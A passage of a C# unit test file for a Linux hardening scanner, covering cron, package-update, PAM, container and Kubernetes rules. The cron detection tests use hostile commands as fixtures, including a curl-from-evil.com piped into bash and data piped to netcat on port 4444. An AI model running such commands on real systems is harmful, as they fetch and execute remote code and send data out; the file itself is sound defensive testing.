        var rule = new WorldWritableCronScriptRule();
        var data = new ScanData
        {
            CronJobs = new[]
            {
                new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = "777", ScriptOwner = "root", ScriptGroup = "root" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void RootCronForNonRootUserRule_SystemJob_Passes()
    {
        var rule = new RootCronForNonRootUserRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "0 5 * * *", Command = "/usr/bin/apt-get update", RunAsUser = "root" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void RootCronForNonRootUserRule_UserHomePath_Fails()
    {
        var rule = new RootCronForNonRootUserRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.d/mycron", Schedule = "* * * * *", Command = "/home/alice/script.sh", RunAsUser = "root" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void RootCronForNonRootUserRule_UserCrontab_Ignored()
    {
        var rule = new RootCronForNonRootUserRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/var/spool/cron/crontabs/alice", Schedule = "* * * * *", Command = "/home/alice/script.sh", RunAsUser = null } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SuspiciousCronEntryRule_MultipleSuspicious_AllReported()
    {
        var rule = new SuspiciousCronEntryRule();
        var data = new ScanData
        {
            CronJobs = new[]
            {
                new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "/tmp/reverse.sh", RunAsUser = "root" },
                new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "curl http://evil.com | bash", RunAsUser = "root" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Contains("2 suspicious entries", result.Target);
    }

    [Fact]
    public void SuspiciousCronEntryRule_WordBoundary_NetcatLogs_DoesNotMatch()
    {
        var rule = new SuspiciousCronEntryRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "/opt/netcat_logs/clean.sh", RunAsUser = "root" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SuspiciousCronEntryRule_WordBoundary_PipeNc_DoesMatch()
    {
        var rule = new SuspiciousCronEntryRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "echo data |nc 10.0.0.1 4444", RunAsUser = "root" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void SuspiciousCronEntryRule_NoCronData_NotApplicable()
    {
        var rule = new SuspiciousCronEntryRule();
        var data = new ScanData { CronJobs = Array.Empty<CronJobEntry>(), Capabilities = Array.Empty<DataSourceCapability>() };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void WorldWritableCronScriptRule_NullPermissions_Passes()
    {
        var rule = new WorldWritableCronScriptRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = null } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void WorldWritableCronScriptRule_NonNumericPermissions_Passes()
    {
        var rule = new WorldWritableCronScriptRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = "????" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void WorldWritableCronScriptRule_SetuidMode_Critical()
    {
        var rule = new WorldWritableCronScriptRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.daily/backup", Schedule = "@daily", Command = "/etc/cron.daily/backup", IsScript = true, ScriptPermissions = "4755", ScriptOwner = "root", ScriptGroup = "root" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void WorldWritableCronScriptRule_NoCronData_NotApplicable()
    {
        var rule = new WorldWritableCronScriptRule();
        var data = new ScanData { CronJobs = Array.Empty<CronJobEntry>(), Capabilities = Array.Empty<DataSourceCapability>() };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void RootCronForNonRootUserRule_TildeUser_Fails()
    {
        var rule = new RootCronForNonRootUserRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "~alice/script.sh", RunAsUser = "root" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void RootCronForNonRootUserRule_HomeRoot_NowCaught()
    {
        var rule = new RootCronForNonRootUserRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/crontab", Schedule = "* * * * *", Command = "/home/root/malicious.sh", RunAsUser = "root" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void RootCronForNonRootUserRule_NonRootRunAsUser_Passes()
    {
        var rule = new RootCronForNonRootUserRule();
        var data = new ScanData
        {
            CronJobs = new[] { new CronJobEntry { SourceFile = "/etc/cron.d/mycron", Schedule = "* * * * *", Command = "/home/alice/script.sh", RunAsUser = "alice" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void RootCronForNonRootUserRule_NoCronData_NotApplicable()
    {
        var rule = new RootCronForNonRootUserRule();
        var data = new ScanData { CronJobs = Array.Empty<CronJobEntry>(), Capabilities = Array.Empty<DataSourceCapability>() };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void CronJobRules_MissingData_Passes()
    {
        var data = new ScanData { CronJobs = Array.Empty<CronJobEntry>() };

        Assert.True(new SuspiciousCronEntryRule().Evaluate(data).Passed);
        Assert.True(new WorldWritableCronScriptRule().Evaluate(data).Passed);
        Assert.True(new RootCronForNonRootUserRule().Evaluate(data).Passed);
    }

    [Theory]
    [InlineData(typeof(SuspiciousCronEntryRule), "CIS 6.1")]
    [InlineData(typeof(WorldWritableCronScriptRule), "CIS 6.1")]
    [InlineData(typeof(RootCronForNonRootUserRule), "CIS 6.2")]
    public void CronJobRules_HaveCisMappings(Type ruleType, string expectedControlId)
    {
        var rule = (IRule)Activator.CreateInstance(ruleType)!;

        Assert.NotEmpty(rule.CisMappings);
        Assert.Contains(rule.CisMappings, m => m.ControlId == expectedControlId);
        Assert.All(rule.CisMappings, m =>
        {
            Assert.False(string.IsNullOrWhiteSpace(m.ControlName));
            Assert.False(string.IsNullOrWhiteSpace(m.WhyItMatters));
        });
    }

    // =====================================================================
    // PackageVulnerabilityRules
    // =====================================================================

    [Fact]
    public void SecurityUpdatesAvailableRule_NoUpdates_Passes()
    {
        var rule = new SecurityUpdatesAvailableRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                VulnerablePackages = Array.Empty<VulnerablePackage>()
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SecurityUpdatesAvailableRule_SecurityUpdate_Fails_WithHighSeverity()
    {
        var rule = new SecurityUpdatesAvailableRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                VulnerablePackages = new[]
                {
                    new VulnerablePackage
                    {
                        Name = "libc6",
                        InstalledVersion = "2.31-0ubuntu9.14",
                        AvailableVersion = "2.31-0ubuntu9.16",
                        IsSecurityUpdate = true
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void SecurityUpdatesAvailableRule_ManyUpdates_Fails_WithCriticalSeverity()
    {
        var rule = new SecurityUpdatesAvailableRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                VulnerablePackages = Enumerable.Range(0, 5).Select(i => new VulnerablePackage
                {
                    Name = $"pkg{i}",
                    InstalledVersion = "1.0",
                    AvailableVersion = "1.1",
                    IsSecurityUpdate = true
                }).ToArray()
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void SecurityUpdatesAvailableRule_NonSecurityUpdate_Passes()
    {
        var rule = new SecurityUpdatesAvailableRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                VulnerablePackages = new[]
                {
                    new VulnerablePackage
                    {
                        Name = "some-app",
                        InstalledVersion = "1.0",
                        AvailableVersion = "1.1",
                        IsSecurityUpdate = false
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SecurityUpdatesAvailableRule_MissingData_NotApplicable()
    {
        var rule = new SecurityUpdatesAvailableRule();
        var data = new ScanData();

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void UnattendedUpgradesEnabledRule_ConfiguredAndEnabled_Passes()
    {
        var rule = new UnattendedUpgradesEnabledRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                UnattendedUpgradesConfigured = true,
                UnattendedUpgradesEnabled = true
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void UnattendedUpgradesEnabledRule_NotConfigured_Fails()
    {
        var rule = new UnattendedUpgradesEnabledRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                UnattendedUpgradesConfigured = false,
                UnattendedUpgradesEnabled = false
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void UnattendedUpgradesEnabledRule_ConfiguredButDisabled_Fails()
    {
        var rule = new UnattendedUpgradesEnabledRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                UnattendedUpgradesConfigured = true,
                UnattendedUpgradesEnabled = false
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void CriticalCvesPresentRule_NoCves_Passes()
    {
        var rule = new CriticalCvesPresentRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                VulnerablePackages = Array.Empty<VulnerablePackage>()
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void CriticalCvesPresentRule_CvesFound_Fails_WithCriticalSeverity()
    {
        var rule = new CriticalCvesPresentRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                CveDataAvailable = true,
                VulnerablePackages = new[]
                {
                    new VulnerablePackage
                    {
                        Name = "libfoo",
                        InstalledVersion = "1.0",
                        AvailableVersion = "1.1",
                        IsSecurityUpdate = true,
                        CveIds = new[] { "CVE-2023-1234", "CVE-2023-5678" }
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void CriticalCvesPresentRule_MissingData_NotApplicable()
    {
        var rule = new CriticalCvesPresentRule();
        var data = new ScanData();

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void CriticalCvesPresentRule_CveDataUnavailable_NotApplicable()
    {
        var rule = new CriticalCvesPresentRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                CveDataAvailable = false
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void CriticalCvesPresentRule_CveDataAvailable_NoCves_Passes()
    {
        var rule = new CriticalCvesPresentRule();
        var data = new ScanData
        {
            PackageVulnerabilities = new PackageVulnerabilityStatus
            {
                PackagesReadable = true,
                CveDataAvailable = true,
                VulnerablePackages = Array.Empty<VulnerablePackage>()
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.Passed, result.Status);
    }

    [Theory]
    [InlineData(typeof(SecurityUpdatesAvailableRule), "CIS 1.9")]
    [InlineData(typeof(UnattendedUpgradesEnabledRule), "CIS 1.9")]
    public void PackageVulnerabilityRules_HaveCisMappings(Type ruleType, string expectedControlId)
    {
        var rule = (IRule)Activator.CreateInstance(ruleType)!;

        Assert.NotEmpty(rule.CisMappings);
        Assert.Contains(rule.CisMappings, m => m.ControlId == expectedControlId);
        Assert.All(rule.CisMappings, m =>
        {
            Assert.False(string.IsNullOrWhiteSpace(m.ControlName));
            Assert.False(string.IsNullOrWhiteSpace(m.WhyItMatters));
        });
    }

    [Fact]
    public void CriticalCvesPresentRule_HasEmptyCisMappings_Intentionally()
    {
        var rule = new CriticalCvesPresentRule();

        Assert.Empty(rule.CisMappings);
    }

    // =====================================================================
    // PAM / Authentication Rules
    // =====================================================================

    [Fact]
    public void PamFaillockConfiguredRule_CompleteConfig_Passes()
    {
        var rule = new PamFaillockConfiguredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "auth required pam_faillock.so preauth silent audit deny=5 unlock_time=900",
                    "auth [success=1 default=bad] pam_unix.so",
                    "auth [default=die] pam_faillock.so authfail audit deny=5 unlock_time=900",
                    "auth sufficient pam_faillock.so authsucc audit deny=5 unlock_time=900",
                    "deny = 5",
                    "unlock_time = 900"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamFaillockConfiguredRule_MissingAuthfail_Fails()
    {
        var rule = new PamFaillockConfiguredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "auth required pam_faillock.so preauth silent audit deny=5 unlock_time=900",
                    "auth [success=1 default=bad] pam_unix.so",
                    "deny = 5"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Contains("authfail", result.Target);
    }

    [Fact]
    public void PamFaillockConfiguredRule_NoAuthLines_Passes()
    {
        var rule = new PamFaillockConfiguredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[] { "password requisite pam_pwquality.so retry=3" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamFaillockConfiguredRule_MissingData_NotApplicable()
    {
        var rule = new PamFaillockConfiguredRule();
        var data = new ScanData { PamConfig = null };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void PamFaillockConfiguredRule_PerFile_MissingInOneFile_Fails()
    {
        var rule = new PamFaillockConfiguredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = Array.Empty<string>(),
                RawLinesByFile = new Dictionary<string, string[]>(StringComparer.OrdinalIgnoreCase)
                {
                    ["/etc/pam.d/common-auth"] = new[]
                    {
                        "auth required pam_faillock.so preauth silent",
                        "auth [default=die] pam_faillock.so authfail",
                        "auth sufficient pam_unix.so"
                    },
                    ["/etc/pam.d/sshd"] = new[]
                    {
                        "auth required pam_unix.so",
                        "auth sufficient pam_google_authenticator.so"
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Contains("sshd", result.Target);
    }

    [Fact]
    public void PamFaillockConfiguredRule_PerFile_FaillockConfOnly_ChecksSpecificFile()
    {
        var rule = new PamFaillockConfiguredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[] { "deny = 5", "auth required pam_faillock.so preauth" },
                RawLinesByFile = new Dictionary<string, string[]>(StringComparer.OrdinalIgnoreCase)
                {
                    ["/etc/security/faillock.conf"] = new[] { "deny = 5", "unlock_time = 900" },
                    ["/etc/pam.d/common-auth"] = new[]
                    {
                        "auth required pam_faillock.so preauth silent",
                        "auth [default=die] pam_faillock.so authfail"
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamPasswordQualityDetailedRule_AllSettings_Passes()
    {
        var rule = new PamPasswordQualityDetailedRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "minlen = 14",
                    "minclass = 3",
                    "dcredit = -1",
                    "ucredit = -1"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamPasswordQualityDetailedRule_PamArgs_Passes()
    {
        var rule = new PamPasswordQualityDetailedRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "password requisite pam_pwquality.so try_first_pass retry=3 minlen=14 minclass=3 dcredit=-1 ucredit=-1 lcredit=-1 ocredit=-1"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamPasswordQualityDetailedRule_ShortMinlen_Fails()
    {
        var rule = new PamPasswordQualityDetailedRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "minlen = 8",
                    "minclass = 3",
                    "dcredit = -1"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Contains("minlen", result.Target);
    }

    [Fact]
    public void PamPasswordQualityDetailedRule_LowMinclass_Fails()
    {
        var rule = new PamPasswordQualityDetailedRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "minlen = 14",
                    "minclass = 2",
                    "dcredit = -1"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Contains("minclass", result.Target);
    }

    [Fact]
    public void PamPasswordQualityDetailedRule_NoCredits_Fails()
    {
        var rule = new PamPasswordQualityDetailedRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "minlen = 14",
                    "minclass = 3"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Contains("credit", result.Target);
    }

    [Fact]
    public void PamPasswordQualityDetailedRule_MissingData_NotApplicable()
    {
        var rule = new PamPasswordQualityDetailedRule();
        var data = new ScanData { PamConfig = null };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void SshUsePamRule_Enabled_Passes()
    {
        var rule = new SshUsePamRule();
        var data = new ScanData
        {
            SshConfig = new SshConfig { ConfigReadable = true, UsePAM = "yes" }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshUsePamRule_Disabled_Fails()
    {
        var rule = new SshUsePamRule();
        var data = new ScanData
        {
            SshConfig = new SshConfig { ConfigReadable = true, UsePAM = "no" }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void SshUsePamRule_NotConfigured_Passes()
    {
        var rule = new SshUsePamRule();
        var data = new ScanData
        {
            SshConfig = new SshConfig { ConfigReadable = true, UsePAM = null }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshUsePamRule_ConfigUnreadable_NotApplicable()
    {
        var rule = new SshUsePamRule();
        var data = new ScanData
        {
            SshConfig = new SshConfig { ConfigReadable = false }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void PamAuthRequiredRule_RequiredBeforeSufficient_Passes()
    {
        var rule = new PamAuthRequiredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "auth required pam_faillock.so preauth silent",
                    "auth [success=1 default=bad] pam_unix.so",
                    "auth sufficient pam_faillock.so authsucc"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamAuthRequiredRule_SufficientBeforeRequired_Fails()
    {
        var rule = new PamAuthRequiredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "auth sufficient pam_faillock.so authsucc",
                    "auth required pam_faillock.so preauth silent",
                    "auth [success=1 default=bad] pam_unix.so"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void PamAuthRequiredRule_BracketedControl_TreatedAsMandatory()
    {
        var rule = new PamAuthRequiredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[]
                {
                    "auth [default=die] pam_faillock.so authfail",
                    "auth sufficient pam_faillock.so authsucc"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamAuthRequiredRule_PerFile_SufficientBeforeRequired_Fails()
    {
        var rule = new PamAuthRequiredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = Array.Empty<string>(),
                RawLinesByFile = new Dictionary<string, string[]>(StringComparer.OrdinalIgnoreCase)
                {
                    ["/etc/pam.d/common-auth"] = new[]
                    {
                        "auth required pam_faillock.so preauth silent",
                        "auth sufficient pam_unix.so"
                    },
                    ["/etc/pam.d/sshd"] = new[]
                    {
                        "auth sufficient pam_google_authenticator.so",
                        "auth required pam_unix.so"
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Contains("sshd", result.Target);
    }

    [Fact]
    public void PamAuthRequiredRule_NoAuthLines_Passes()
    {
        var rule = new PamAuthRequiredRule();
        var data = new ScanData
        {
            PamConfig = new PamConfig
            {
                Readable = true,
                RawLines = new[] { "password requisite pam_pwquality.so retry=3" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void PamAuthRequiredRule_MissingData_NotApplicable()
    {
        var rule = new PamAuthRequiredRule();
        var data = new ScanData { PamConfig = null };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    // =====================================================================
    // Container Rules
    // =====================================================================

    [Fact]
    public void PrivilegedContainerRule_PrivilegedExists_Fails()
    {
        var rule = new PrivilegedContainerRule();
        var data = new ScanData
        {
            Containers = new[]
            {
                new ContainerInfo { Name = "web", Image = "nginx", Tag = "latest", IsPrivileged = true, Runtime = "docker" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void PrivilegedContainerRule_NoPrivileged_Passes()
    {
        var rule = new PrivilegedContainerRule();
        var data = new ScanData
        {
            Containers = new[]
            {
                new ContainerInfo { Name = "web", Image = "nginx", Tag = "latest", IsPrivileged = false, Runtime = "docker" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void LatestTagRule_LatestExists_Fails()
    {
        var rule = new LatestTagRule();
        var data = new ScanData
        {
            Containers = new[]
            {
                new ContainerInfo { Name = "web", Image = "nginx", Tag = "latest", Runtime = "docker" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void LatestTagRule_ExplicitTag_Passes()
    {
        var rule = new LatestTagRule();
        var data = new ScanData
        {
            Containers = new[]
            {
                new ContainerInfo { Name = "web", Image = "nginx", Tag = "1.25", Runtime = "docker" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void DockerSocketExposedRule_SocketMounted_Fails()
    {
        var rule = new DockerSocketExposedRule();
        var data = new ScanData
        {
            Containers = new[]
            {
                new ContainerInfo { Name = "web", Image = "nginx", Tag = "latest", HasDockerSocketMount = true, Runtime = "docker" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void DockerSocketExposedRule_HostSocketExists_Fails()
    {
        var rule = new DockerSocketExposedRule();
        var data = new ScanData
        {
            ContainerRuntime = new ContainerRuntimeInfo { DockerSocketExposed = true },
            Containers = Array.Empty<ContainerInfo>()
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
        Assert.Contains("/var/run/docker.sock", result.Target);
    }

    [Fact]
    public void DockerSocketExposedRule_Safe_Passes()
    {
        var rule = new DockerSocketExposedRule();
        var data = new ScanData
        {
            Containers = Array.Empty<ContainerInfo>()
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void KnownBadBaseLayerRule_RiskyBase_Fails()
    {
        var rule = new KnownBadBaseLayerRule();
        var data = new ScanData
        {
            Containers = new[]
            {
                new ContainerInfo
                {
                    Name = "legacy",
                    Image = "legacy",
                    Tag = "1.0",
                    KnownBadBaseLayers = new[] { "ubuntu:14.04 EOL base image" },
                    Runtime = "docker"
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void KnownBadBaseLayerRule_NoRiskyBase_Passes()
    {
        var rule = new KnownBadBaseLayerRule();
        var data = new ScanData
        {
            Containers = new[]
            {
                new ContainerInfo { Name = "web", Image = "nginx", Tag = "1.25", Runtime = "docker" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void ContainerdWeakDefaultsRule_WeakDefault_Fails()
    {
        var rule = new ContainerdWeakDefaultsRule();
        var data = new ScanData
        {
            ContainerRuntime = new ContainerRuntimeInfo { ContainerdAvailable = true },
            Warnings = new[] { "Containerd default namespace is in use without explicit isolation." }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void ContainerdWeakDefaultsRule_NotAvailable_Passes()
    {
        var rule = new ContainerdWeakDefaultsRule();
        var data = new ScanData
        {
            ContainerRuntime = new ContainerRuntimeInfo { ContainerdAvailable = false }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void ContainerRules_MissingData_Passes()
    {
        var data = new ScanData { Containers = Array.Empty<ContainerInfo>(), ContainerRuntime = null };

        Assert.True(new PrivilegedContainerRule().Evaluate(data).Passed);
        Assert.True(new LatestTagRule().Evaluate(data).Passed);
        Assert.True(new DockerSocketExposedRule().Evaluate(data).Passed);
        Assert.True(new KnownBadBaseLayerRule().Evaluate(data).Passed);
        Assert.True(new ContainerdWeakDefaultsRule().Evaluate(data).Passed);
    }

    // =====================================================================
    // Kubernetes Rules
    // =====================================================================

    [Fact]
    public void K8sPrivilegedPodRule_PrivilegedExists_Fails()
    {
        var rule = new K8sPrivilegedPodRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "bad-pod",
                    Containers = new[]
                    {
                        new K8sContainerInfo { Name = "app", Image = "app:1.0", Privileged = true }
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void K8sPrivilegedPodRule_NoPrivileged_Passes()
    {
        var rule = new K8sPrivilegedPodRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "safe-pod",
                    Containers = new[]
                    {
                        new K8sContainerInfo { Name = "app", Image = "app:1.0", Privileged = false }
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void K8sHostNamespaceRule_HostNetwork_Fails()
    {
        var rule = new K8sHostNamespaceRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "bad-pod",
                    HostNetwork = true,
                    Violations = new[] { "Pod 'bad-pod' uses hostNetwork" },
                    Containers = Array.Empty<K8sContainerInfo>()
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void K8sHostNamespaceRule_HostIpc_Fails()
    {
        var rule = new K8sHostNamespaceRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
